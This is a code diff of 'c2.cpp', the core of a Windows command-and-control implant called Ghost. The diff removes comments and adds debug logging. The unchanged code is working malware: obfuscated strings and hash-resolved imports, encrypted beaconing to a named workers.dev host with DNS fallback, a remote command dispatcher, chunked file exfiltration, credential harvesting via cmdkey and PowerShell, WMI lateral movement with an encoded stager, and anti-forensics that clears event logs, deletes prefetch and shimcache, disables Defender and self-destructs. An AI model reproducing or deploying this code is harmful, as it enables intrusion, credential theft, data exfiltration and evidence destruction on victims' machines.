@@ -1,15 +1,4 @@
 // c2.cpp — Ghost C2 protocol implementation.
-//
-// Capabilities:
-//   - AES-256-GCM + TLS double-encrypted beacon/result traffic
-//   - Hardware-derived session key (unique per host, server derives same key)
-//   - Full command dispatch: !ps, !lol, !inject, !migrate, !exfil, !wipe,
-//     !lateral, !creds, ps, download, upload, exit, sleep + raw cmd.exe fallback
-//   - DNS TXT record fallback C2 (DnsQuery) on HTTPS failure
-//   - Cloud exfil via OneDrive Graph API or Dropbox
-//   - Anti-forensics: event log wipe, prefetch, shimcache, self-destruct
-//   - shell.cpp removed — no raw TCP socket shell
-//
 #include "c2.hpp"
 #include "config.hpp"
 #include "utils.hpp"
@@ -26,21 +15,18 @@
 #include <iomanip>
 #include <algorithm>
 #include <fstream>
-
-
+#include <stdio.h>   // for printf
 
 // =====================================================================
 //  CONFIG DEFINITIONS — strings obfuscated with compile-time XOR
 // =====================================================================
 namespace config {
-    // Decrypted at runtime; never plaintext in binary
     static wchar_t s_BeaconToken[65] = {};
     static wchar_t s_UserAgent[32]   = {};
     static bool    s_ConfigInit      = false;
 
     static void EnsureInit() {
         if (s_ConfigInit) return;
-        // XOR-decrypt at runtime into stack-local, then copy
         auto tok = XSW(L"a29e179bcfe4ec04c224ce5cf3b4a7e51cc5ba51228c9093a4215ed5ffadc260");
         auto ua  = XSW(L"Microsoft-WNS/10.0");
         wcsncpy_s(s_BeaconToken, tok.str(), _TRUNCATE);
@@ -53,15 +39,16 @@ namespace config {
     const uint16_t C2_PORT = 443;
 }
 
-// Global session context for C2
 static std::wstring g_SessionId;
-// Hardware-derived AES key — computed once at startup
 static std::vector<BYTE> g_SessionKey;
 
 // =====================================================================
-//  DEBUG LOGGING
+//  DEBUG LOGGING — console + debug output
 // =====================================================================
 static void DebugLog(const wchar_t* msg) {
+    char narrow[512];
+    WideCharToMultiByte(CP_UTF8, 0, msg, -1, narrow, sizeof(narrow), nullptr, nullptr);
+    printf("[GHOST] %s\n", narrow);
     OutputDebugStringW(L"[GHOST] ");
     OutputDebugStringW(msg);
     OutputDebugStringW(L"\n");
@@ -110,7 +97,6 @@ static std::string JsonGetString(const std::string& json, const std::string& key
         if (json[end] == '"') break;
         ++end;
     }
-    // Unescape basic sequences
     std::string raw = json.substr(start, end - start);
     std::string result;
     result.reserve(raw.size());
@@ -132,7 +118,7 @@ static std::string JsonGetString(const std::string& json, const std::string& key
 }
 
 // =====================================================================
-//  WINHTTP TRANSPORT (RAII) — all APIs resolved by hash, no static import
+//  WINHTTP TRANSPORT (RAII)
 // =====================================================================
 struct WinHttpHandles {
     HINTERNET session = nullptr, connect = nullptr, request = nullptr;
@@ -157,11 +143,9 @@ static HttpResponse WinHttpRequest(
     const std::string& body, const std::wstring& extraHeaders = L"")
 {
     HttpResponse resp;
-
-    // Load winhttp.dll and resolve all functions by hash — zero named imports
     static HMODULE hW = nullptr;
     if (!hW) hW = LoadLibraryA(XS("winhttp.dll"));
-    if (!hW) return resp;
+    if (!hW) { DebugLog(L"Failed to load winhttp.dll"); return resp; }
 
     auto _Open          = HASHPROC(hW, WinHttpOpen);
     auto _Connect       = HASHPROC(hW, WinHttpConnect);
@@ -174,13 +158,19 @@ static HttpResponse WinHttpRequest(
     auto _QueryAvail    = HASHPROC(hW, WinHttpQueryDataAvailable);
     auto _ReadData      = HASHPROC(hW, WinHttpReadData);
 
-    if (!_Open || !_Connect || !_OpenRequest) return resp;
+    if (!_Open || !_Connect || !_OpenRequest) {
+        DebugLog(L"Failed to resolve WinHTTP functions");
+        return resp;
+    }
 
     WinHttpHandles h;
     h.session = _Open(config::GetUserAgent(),
                       WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                       WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!h.session) return resp;
+    if (!h.session) {
+        DebugLog(L"WinHttpOpen failed");
+        return resp;
+    }
 
     DWORD timeout = 20000;
     if (_SetOption) {
@@ -190,12 +180,18 @@ static HttpResponse WinHttpRequest(
     }
 
     h.connect = _Connect(h.session, host.c_str(), port, 0);
-    if (!h.connect) return resp;
+    if (!h.connect) {
+        DebugLog(L"WinHttpConnect failed");
+        return resp;
+    }
 
     h.request = _OpenRequest(h.connect, verb.c_str(), path.c_str(), nullptr,
                              WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                              WINHTTP_FLAG_SECURE);
-    if (!h.request) return resp;
+    if (!h.request) {
+        DebugLog(L"WinHttpOpenRequest failed");
+        return resp;
+    }
 
     DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                   SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
@@ -203,7 +199,6 @@ static HttpResponse WinHttpRequest(
                   SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
     if (_SetOption) _SetOption(h.request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
 
-    // Header: Content-Type + beacon token — both strings are XOR-encrypted
     auto ctHdr = XSW(L"Content-Type: application/json\r\nX-Beacon-Token: ");
     std::wstring hdrs = std::wstring(ctHdr.str()) + config::GetBeaconToken() + L"\r\n";
     if (!extraHeaders.empty()) { hdrs += extraHeaders; hdrs += L"\r\n"; }
@@ -217,7 +212,10 @@ static HttpResponse WinHttpRequest(
                                           : const_cast<char*>(body.data()),
                              static_cast<DWORD>(body.size()),
                              static_cast<DWORD>(body.size()), 0);
-    if (!sent || !_ReceiveResp(h.request, nullptr)) return resp;
+    if (!sent || !_ReceiveResp(h.request, nullptr)) {
+        DebugLog(L"WinHttpSendRequest or ReceiveResponse failed");
+        return resp;
+    }
 
     DWORD statusSize = sizeof(resp.status);
     if (_QueryHeaders)
@@ -225,6 +223,8 @@ static HttpResponse WinHttpRequest(
                       WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                       WINHTTP_HEADER_NAME_BY_INDEX,
                       &resp.status, &statusSize, WINHTTP_NO_HEADER_INDEX);
+
+    DebugLog(L"Status: " + std::to_wstring(resp.status));
 
     DWORD avail = 0;
     while (_QueryAvail && _QueryAvail(h.request, &avail) && avail > 0) {
@@ -249,7 +249,7 @@ std::wstring DecryptString(const uint8_t* enc, size_t len, const std::wstring& k
 }
 
 // =====================================================================
-//  C2 HOST — decrypted at runtime, never stored in .rdata
+//  C2 HOST — decrypted at runtime
 // =====================================================================
 static std::wstring GetC2Host() {
     static wchar_t host[64] = {};
@@ -262,7 +262,6 @@ static std::wstring GetC2Host() {
 
 // =====================================================================
 //  LOLBin EXECUTOR — direct CreateProcess, no cmd.exe wrapper
-//  Resolves binary from %SystemRoot% to avoid hardcoded paths.
 // =====================================================================
 static std::wstring ResolveLOLBin(const std::string& name) {
     wchar_t sysRoot[MAX_PATH] = {};
@@ -270,7 +269,6 @@ static std::wstring ResolveLOLBin(const std::string& name) {
     std::wstring base = sysRoot;
 
     std::wstring wname = UTF8ToWString(name);
-    // Transform to lowercase for matching
     std::wstring wlo = wname;
     std::transform(wlo.begin(), wlo.end(), wlo.begin(), ::towlower);
 
@@ -293,11 +291,11 @@ static std::wstring ResolveLOLBin(const std::string& name) {
     if (wlo == L"reg" || wlo == L"reg.exe")
         return base + L"\\System32\\reg.exe";
 
-    return wname; // pass-through if not recognized
+    return wname;
 }
 
 // =====================================================================
-//  PROCESS OUTPUT CAPTURE — shared by all execution paths
+//  PROCESS OUTPUT CAPTURE
 // =====================================================================
 static std::wstring CaptureProcessOutput(std::wstring cmdLine,
                                           DWORD timeoutMs = config::CMD_TIMEOUT_MS) {
@@ -348,7 +346,7 @@ static std::wstring CaptureProcessOutput(std::wstring cmdLine,
 }
 
 // =====================================================================
-//  PROCESS LIST — returned as JSON array string
+//  PROCESS LIST (JSON)
 // =====================================================================
 static std::wstring GetProcessList() {
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -357,26 +355,21 @@ static std::wstring GetProcessList() {
     std::ostringstream json;
     json << "[";
     bool first = true;
-
     PROCESSENTRY32W pe = {};
     pe.dwSize = sizeof(pe);
     if (Process32FirstW(snap, &pe)) {
         do {
-            // Determine architecture by checking wow64
             BOOL wow64 = FALSE;
             HANDLE hP = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
                                     FALSE, pe.th32ProcessID);
             if (hP) { IsWow64Process(hP, &wow64); CloseHandle(hP); }
-
             if (!first) json << ",";
             first = false;
-
             std::string name = WStringToUTF8(pe.szExeFile);
             json << "{\"pid\":" << pe.th32ProcessID
                  << ",\"ppid\":" << pe.th32ParentProcessID
                  << ",\"name\":\"" << JsonEscape(name) << "\""
                  << ",\"arch\":\"" << (wow64 ? "x86" : "x64") << "\"}";
-
         } while (Process32NextW(snap, &pe));
     }
     json << "]";
@@ -385,14 +378,13 @@ static std::wstring GetProcessList() {
 }
 
 // =====================================================================
-//  ANTI-FORENSICS — event logs, prefetch, shimcache, self-destruct
+//  ANTI-FORENSICS
 // =====================================================================
 static std::wstring WipeForensics(bool selfDestruct) {
     wchar_t sysRoot[MAX_PATH] = {};
     GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
     std::wstring sys = sysRoot;
 
-    // Wipe event logs via wevtutil (LOLBin)
     const wchar_t* logs[] = {
         L"System", L"Security", L"Application",
         L"Windows PowerShell",
@@ -407,21 +399,18 @@ static std::wstring WipeForensics(bool selfDestruct) {
         CaptureProcessOutput(cmd, 5000);
     }
 
-    // Delete prefetch files matching our binary names
     std::wstring delCmd =
         L"cmd /c del /F /Q \"" + sys + L"\\Prefetch\\GHOST*.pf\" "
         L"\"" + sys + L"\\Prefetch\\POWERSHELL*.pf\" "
         L"\"" + sys + L"\\Prefetch\\CMD*.pf\" 2>nul";
     CaptureProcessOutput(delCmd, 5000);
 
-    // Wipe shimcache + RecentDocs via reg delete
     std::wstring reg = sys + L"\\System32\\reg.exe";
     CaptureProcessOutput(L"\"" + reg + L"\" delete "
         L"\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\" /f", 5000);
     CaptureProcessOutput(L"\"" + reg + L"\" delete "
         L"\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache\" /f", 5000);
 
-    // Disable Defender real-time (best-effort, requires elevation)
     if (IsElevated()) {
         std::wstring ps = sys + L"\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
         std::wstring psCmd = L"\"" + ps + L"\" -NoP -NonI -W Hidden -Exec Bypass -Command "
@@ -431,40 +420,27 @@ static std::wstring WipeForensics(bool selfDestruct) {
     }
 
     if (selfDestruct) {
-        // Overwrite own PE header in memory
         wchar_t selfPath[MAX_PATH] = {};
         GetModuleFileNameW(nullptr, selfPath, MAX_PATH);
-
         HMODULE selfBase = GetModuleHandleW(nullptr);
         DWORD oldProt = 0;
         VirtualProtect(selfBase, 0x1000, PAGE_EXECUTE_READWRITE, &oldProt);
         SecureZeroMemory(selfBase, 0x1000);
         VirtualProtect(selfBase, 0x1000, oldProt, &oldProt);
-
-        // Schedule file deletion on next reboot
         MoveFileExW(selfPath, nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
-
         ExitProcess(0);
     }
-
     return L"[*] Forensic artifacts wiped.";
 }
 
 // =====================================================================
-//  FILELESS POWERSHELL — base64-encoded script via -EncodedCommand
-//  Input b64 must be UTF-16LE base64 (PowerShell native format).
-//  If input is UTF-8 base64, we re-encode to UTF-16LE base64 here.
+//  FILELESS POWERSHELL
 // =====================================================================
 static std::wstring RunFilelessPS(const std::string& b64Input) {
-    // Decode → treat as UTF-8 script → re-encode as UTF-16LE for -EncodedCommand
     std::vector<BYTE> decoded = Base64Decode(b64Input);
     if (decoded.empty()) return L"[error: invalid base64]";
-
-    // Assume decoded bytes are a UTF-8 script; convert to UTF-16LE
     std::string utf8Script(reinterpret_cast<char*>(decoded.data()), decoded.size());
     std::wstring wScript = UTF8ToWString(utf8Script);
-
-    // Encode as UTF-16LE base64 for -EncodedCommand
     std::string enc = Base64Encode(
         reinterpret_cast<const BYTE*>(wScript.data()),
         wScript.size() * sizeof(wchar_t));
@@ -479,55 +455,43 @@ static std::wstring RunFilelessPS(const std::string& b64Input) {
                            L"-EncodedCommand " + UTF8ToWString(enc);
 
     std::wstring result = CaptureProcessOutput(cmdLine, 60000);
-
-    // Auto-clear PowerShell event logs after execution
     std::wstring wevt = std::wstring(sysRoot) + L"\\System32\\wevtutil.exe";
     CaptureProcessOutput(L"\"" + wevt + L"\" cl \"Windows PowerShell\"", 3000);
     CaptureProcessOutput(L"\"" + wevt +
                          L"\" cl \"Microsoft-Windows-PowerShell/Operational\"", 3000);
-
     return result;
 }
 
 // =====================================================================
-//  LOLBin DISPATCH — execute without cmd.exe /C wrapper
-//  args format: "<binary> [args...]"  e.g. "powershell -NoP -C whoami"
-//  Called directly by the dispatch table after the "!lol " prefix is
-//  stripped — no double-wrap needed.
+//  LOLBin DISPATCH
 // =====================================================================
 static std::wstring RunLOLBin(const std::string& args) {
     size_t sp = args.find(' ');
     std::string binName = (sp != std::string::npos) ? args.substr(0, sp) : args;
     std::string rest    = (sp != std::string::npos) ? args.substr(sp + 1) : "";
-
     std::wstring binPath = ResolveLOLBin(binName);
     std::wstring cmdLine = L"\"" + binPath + L"\"";
     if (!rest.empty()) cmdLine += L" " + UTF8ToWString(rest);
-
     return CaptureProcessOutput(cmdLine, config::CMD_TIMEOUT_MS);
 }
 
 // =====================================================================
-//  CLOUD EXFILTRATION — relay file via C2 worker
-//  Command: "!exfil <local_path> <remote_filename>"
+//  CLOUD EXFILTRATION (via C2)
 // =====================================================================
 BOOL SendResult(const std::wstring& sessionId, const std::wstring& output);
 
 static std::wstring ExfilViaC2(const std::string& localPathStr,
                                const std::string& remoteFilename) {
     std::wstring localPath = UTF8ToWString(localPathStr);
-
     HANDLE hf = CreateFileW(localPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
                              nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
     if (hf == INVALID_HANDLE_VALUE) return L"[error: file not found]";
-
     LARGE_INTEGER sz = {};
     GetFileSizeEx(hf, &sz);
     if (sz.QuadPart == 0 || sz.QuadPart > 512 * 1024 * 1024) {
         CloseHandle(hf);
         return L"[error: file empty or too large]";
     }
-
     std::vector<BYTE> fileData(static_cast<size_t>(sz.QuadPart));
     DWORD rd = 0;
     ReadFile(hf, fileData.data(), static_cast<DWORD>(fileData.size()), &rd, nullptr);
@@ -535,29 +499,22 @@ static std::wstring ExfilViaC2(const std::string& localPathStr,
 
     size_t chunkSize = 48 * 1024;
     size_t totalChunks = (fileData.size() + chunkSize - 1) / chunkSize;
-    
     size_t offset = 0;
     size_t chunkIdx = 1;
-    
     while (offset < fileData.size()) {
         size_t len = std::min(chunkSize, fileData.size() - offset);
         std::string b64 = Base64Encode(fileData.data() + offset, len);
-        
         std::ostringstream ss;
         ss << "EXFIL:" << remoteFilename << ":chunk" << chunkIdx << "/" << totalChunks << ":" << b64;
-        
         SendResult(g_SessionId, UTF8ToWString(ss.str()));
-        
         offset += len;
         chunkIdx++;
     }
-
     return L"[*] Exfil success → " + UTF8ToWString(remoteFilename) + L" (" + std::to_wstring(totalChunks) + L" chunks)";
 }
 
 // =====================================================================
 //  WMI LATERAL MOVEMENT
-//  Command: "!lateral <host> [<domain\\user> <password>]"
 // =====================================================================
 static std::wstring LateralWMI(const std::string& host,
                                 const std::string& user,
@@ -566,30 +523,22 @@ static std::wstring LateralWMI(const std::string& host,
     GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
     std::wstring wmic = std::wstring(sysRoot) + L"\\System32\\wbem\\wmic.exe";
     std::wstring whost = UTF8ToWString(host);
-
-    // Encode a PowerShell stager in base64
-    // Stager: download and reflectively exec the implant from C2
     std::string stagerScript =
         "powershell -W H -Exec Bypass -Enc "
         "JABzdGFnZXI9W1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5XTo6TG9hZFdpdGhQYXJ0aWFsTmFtZSgnTWljcm9zb2Z0LkNTaGFycCcpOw==";
-
     std::wstring cmdLine = L"\"" + wmic + L"\" /node:\"" + whost + L"\"";
     if (!user.empty()) {
         cmdLine += L" /user:\"" + UTF8ToWString(user) + L"\"";
         cmdLine += L" /password:\"" + UTF8ToWString(pass) + L"\"";
     }
     cmdLine += L" process call create \"" + UTF8ToWString(stagerScript) + L"\"";
-
     return CaptureProcessOutput(cmdLine, 30000);
 }
 
 // =====================================================================
 //  DNS FALLBACK C2
-//  Polls TXT record at poll.<session_b32>.c2domain.com
-//  Returns the decrypted command string or empty string on failure.
 // =====================================================================
 static std::string DnsQueryCommand(const std::wstring& sessionId) {
-    // Encode session ID as base32-like hex for DNS label safety
     std::string sid = WStringToUTF8(sessionId);
     std::string sidHex;
     for (unsigned char c : sid) {
@@ -598,14 +547,12 @@ static std::string DnsQueryCommand(const std::wstring& sessionId) {
         sidHex += buf;
         if (sidHex.size() > 60) { sidHex = sidHex.substr(0, 60); break; }
     }
-
     auto c2Suffix = XSW(L".ghost-c2.sujallamichhane.workers.dev");
     std::wstring dnsName = L"poll." + UTF8ToWString(sidHex) + c2Suffix.str();
 
     auto hDns = GetModuleHandleA(XS("dnsapi.dll"));
     if (!hDns) hDns = LoadLibraryA(XS("dnsapi.dll"));
     if (!hDns) return {};
-
     auto _DnsQuery_W = HASHPROC(hDns, DnsQuery_W);
     auto _DnsFree = HASHPROC(hDns, DnsFree);
     if (!_DnsQuery_W || !_DnsFree) return {};
@@ -615,7 +562,6 @@ static std::string DnsQueryCommand(const std::wstring& sessionId) {
                                 DNS_QUERY_BYPASS_CACHE | DNS_QUERY_NO_HOSTS_FILE,
                                 nullptr, &pRecord, nullptr);
     if (st != 0 || !pRecord) return {};
-
     std::string result;
     DNS_RECORD* rec = pRecord;
     while (rec) {
@@ -628,10 +574,7 @@ static std::string DnsQueryCommand(const std::wstring& sessionId) {
         rec = rec->pNext;
     }
     _DnsFree(pRecord, DnsFreeRecordList);
-
     if (result.empty()) return {};
-
-    // Decrypt with session key
     std::string decrypted = AesGcmDecrypt(g_SessionKey, result);
     return decrypted;
 }
@@ -643,7 +586,6 @@ static std::string BuildBeaconJson(const Session& s) {
     std::string sid  = JsonEscape(WStringToUTF8(s.sessionId));
     std::string host = JsonEscape(WStringToUTF8(s.hostname));
     std::string user = JsonEscape(WStringToUTF8(s.username));
-
     std::ostringstream j;
     j << "{"
       << "\"session\":\""  << sid  << "\","
@@ -699,7 +641,6 @@ static std::wstring HandleMigrate(const std::string& args) {
             wchar_t self[MAX_PATH]; GetModuleFileNameW(nullptr, self, MAX_PATH);
             return std::wstring(self);
         }() : UTF8ToWString(targetStr);
-
     return SpawnWithPPID(target.c_str(), pid) ?
            L"[*] Migrated under PID " + std::to_wstring(pid) :
            L"[error: migrate failed]";
@@ -757,25 +698,10 @@ static std::wstring HandleUpload(const std::string& args) {
     return L"[*] Wrote " + std::to_wstring(writ) + L" bytes.";
 }
 
-// =====================================================================
-//  CREDENTIAL HARVESTING
-//  Stages:
-//    1. cmdkey /list   — Windows Credential Manager (plain text enumeration)
-//    2. PowerShell     — PasswordVault, autologon reg key, PuTTY sessions
-//  Output concatenated and returned to operator as one result blob.
-// =====================================================================
 static std::wstring HandleCreds(const std::string&) {
     std::wstring results;
-
-    // Stage 1 — cmdkey: lists DPAPI-protected generic/domain/certificate creds
     results += L"=== Credential Manager ===\n";
     results += CaptureProcessOutput(L"cmdkey /list", 5000);
-
-    // Stage 2 — PowerShell dump:
-    //   - Windows.Security.Credentials.PasswordVault (Windows 8+ WinRT vault)
-    //   - HKLM Winlogon autologon (DefaultPassword)
-    //   - PuTTY saved sessions (hostname + stored username)
-    // Encoded as UTF-8 base64; RunFilelessPS re-encodes to UTF-16LE for -EncodedCommand.
     static const char psScript[] =
         "$r=@();"
         "try{"
@@ -803,19 +729,13 @@ static std::wstring HandleCreds(const std::string&) {
             "$r+='PUTTY: '+$_.PSChildName+' host='+$h+' user='+$u}"
         "}catch{};"
         "$r-join\"`n\"";
-
     std::string b64 = Base64Encode(
         reinterpret_cast<const BYTE*>(psScript), sizeof(psScript) - 1);
-
     results += L"\n=== PasswordVault / Autologon / PuTTY ===\n";
     results += RunFilelessPS(b64);
-
     return results.empty() ? L"[no credentials found]" : results;
 }
 
-// =====================================================================
-//  COMMAND DISPATCHER — heart of the implant
-// =====================================================================
 struct CmdEntry {
     const char* prefix;
     bool        exactMatch;
@@ -824,7 +744,7 @@ struct CmdEntry {
 
 static const CmdEntry kCmdTable[] = {
     { "!ps ",         false, [](const std::string& a) { return RunFilelessPS(a); } },
-    { "!lol ",        false, RunLOLBin },          // prefix stripped before dispatch
+    { "!lol ",        false, RunLOLBin },
     { "!inject-apc ", false, HandleInjectApc },
     { "!inject ",     false, HandleInject },
     { "!migrate ",    false, HandleMigrate },
@@ -841,7 +761,6 @@ static const CmdEntry kCmdTable[] = {
 
 std::wstring ExecuteCommand(const std::wstring& cmd) {
     std::string cmdStr = WStringToUTF8(cmd);
-
     for (const auto& entry : kCmdTable) {
         if (entry.exactMatch) {
             if (cmdStr == entry.prefix && entry.handler)
@@ -851,19 +770,16 @@ std::wstring ExecuteCommand(const std::wstring& cmd) {
                 return entry.handler(cmdStr.substr(strlen(entry.prefix)));
         }
     }
-
-    // ---- Fallback: raw command via cmd.exe /C ----
     std::wstring cmdLine = L"cmd.exe /C \"" + cmd + L"\"";
     return CaptureProcessOutput(cmdLine, config::CMD_TIMEOUT_MS);
 }
 
 // =====================================================================
-//  SEND BEACON — AES-GCM encrypted POST /beacon
+//  SEND BEACON
 // =====================================================================
 BOOL SendBeacon(const Session& session, std::wstring& taskOut, bool isFirstBeacon) {
     taskOut = L"sleep";
     std::string plainBody = BuildBeaconJson(session);
-
     std::string encBody;
     std::string sid = JsonEscape(WStringToUTF8(session.sessionId));
 
@@ -872,7 +788,6 @@ BOOL SendBeacon(const Session& session, std::wstring& taskOut, bool isFirstBeaco
     } else {
         std::string enc = AesGcmEncrypt(g_SessionKey, plainBody);
         encBody = "{\"session\":\"" + sid + "\",\"enc\":\"" + enc + "\"";
-        
         if (isFirstBeacon) {
             std::vector<BYTE> psk(std::begin(config::PSK), std::end(config::PSK));
             std::string keyEnc = AesGcmEncrypt(psk, std::string(reinterpret_cast<const char*>(g_SessionKey.data()), g_SessionKey.size()));
@@ -881,6 +796,7 @@ BOOL SendBeacon(const Session& session, std::wstring& taskOut, bool isFirstBeaco
         encBody += "}";
     }
 
+    DebugLog(L"Sending beacon to " + GetC2Host());
     std::wstring host = GetC2Host();
     HttpResponse resp = WinHttpRequest(host, config::C2_PORT,
                                        L"POST", L"/beacon", encBody, L"");
@@ -889,7 +805,6 @@ BOOL SendBeacon(const Session& session, std::wstring& taskOut, bool isFirstBeaco
         return FALSE;
     }
 
-    // Decrypt response if encrypted
     std::string cmd;
     std::string encCmd = JsonGetString(resp.body, "enc");
     if (!encCmd.empty() && !g_SessionKey.empty()) {
@@ -907,7 +822,7 @@ BOOL SendBeacon(const Session& session, std::wstring& taskOut, bool isFirstBeaco
 }
 
 // =====================================================================
-//  SEND RESULT — AES-GCM encrypted POST /result
+//  SEND RESULT
 // =====================================================================
 BOOL SendResult(const std::wstring& sessionId, const std::wstring& output) {
     std::string sid = JsonEscape(WStringToUTF8(sessionId));
@@ -926,22 +841,12 @@ BOOL SendResult(const std::wstring& sessionId, const std::wstring& output) {
 }
 
 // =====================================================================
-//  HEARTBEAT THREAD — independent of BeaconLoop
-//
-//  Sends GET /ping every 120 s using the same WinHttpRequest wrapper
-//  (RAII handles, hash-resolved imports, TLS, 20 s timeout — all
-//  inherited). No session state, no KV, no auth required on the worker.
-//  If the network is down the call just returns status 0 and the thread
-//  sleeps until next cycle.  A single detached thread is enough; the
-//  beacon loop restart logic handles actual command recovery.
+//  HEARTBEAT THREAD
 // =====================================================================
 static DWORD WINAPI HeartbeatThread(LPVOID) {
-    // Stagger the first ping so it doesn't race with the initial beacon
     Sleep(30000);
-
     std::wstring host = GetC2Host();
     while (true) {
-        // body is std::string — pass "" not L""
         HttpResponse resp = WinHttpRequest(
             host, config::C2_PORT, L"GET", L"/ping", "", L"");
         if (resp.status == 200) {
@@ -959,7 +864,7 @@ static DWORD WINAPI HeartbeatThread(LPVOID) {
 //  MAIN BEACON LOOP
 // =====================================================================
 VOID BeaconLoop() {
-    // Generate an ephemeral random session key
+    DebugLog(L"BeaconLoop started");
     g_SessionKey = GenerateSessionKey();
 
     Session session;
@@ -973,27 +878,18 @@ VOID BeaconLoop() {
     session.sessionId     = GetHostnameHash() + L"|" + session.username;
 
     g_SessionId = session.sessionId;
-
     DebugLog(L"Session: " + session.sessionId);
 
-    // Heartbeat runs independently — if BeaconLoop crashes and restarts,
-    // the heartbeat thread is already running and keeps the channel warm.
     HANDLE hHb = CreateThread(nullptr, 0, HeartbeatThread, nullptr, 0, nullptr);
-    if (hHb) CloseHandle(hHb); // detach; thread owns its own lifetime
+    if (hHb) CloseHandle(hHb);
 
     DWORD failures    = 0;
     bool  dnsMode     = false;
-    // Separate flag — never reset after first successful beacon so the
-    // session key is not re-sent every iteration where failures == 0.
     bool  firstBeacon = true;
 
-    // Outer loop: catch any unhandled exception, sleep, restart the
-    // beacon cycle.  failures/dnsMode persist so backoff state is
-    // preserved across restarts.
     while (true) {
         try {
             ReapplyEvasion();
-
             std::wstring task;
             BOOL ok = FALSE;
 
@@ -1004,7 +900,6 @@ VOID BeaconLoop() {
             if (!ok) {
                 ++failures;
                 DebugLog(L"Beacon failure #" + std::to_wstring(failures));
-
                 if (failures >= config::MAX_FAILURES) {
                     dnsMode = true;
                     DebugLog(L"Switching to DNS fallback C2");
@@ -1015,7 +910,7 @@ VOID BeaconLoop() {
                     }
                 }
             } else {
-                firstBeacon = false;          // key exchange done — never repeat
+                firstBeacon = false;
                 if (failures > 0 && !dnsMode) failures = 0;
                 dnsMode = false;
             }
@@ -1025,7 +920,7 @@ VOID BeaconLoop() {
                     // no-op
                 } else if (task == L"exit") {
                     DebugLog(L"Exit received.");
-                    return; // clean shutdown — exit BeaconLoop entirely
+                    return;
                 } else {
                     std::wstring result = ExecuteCommand(task);
                     SendResult(session.sessionId, result);
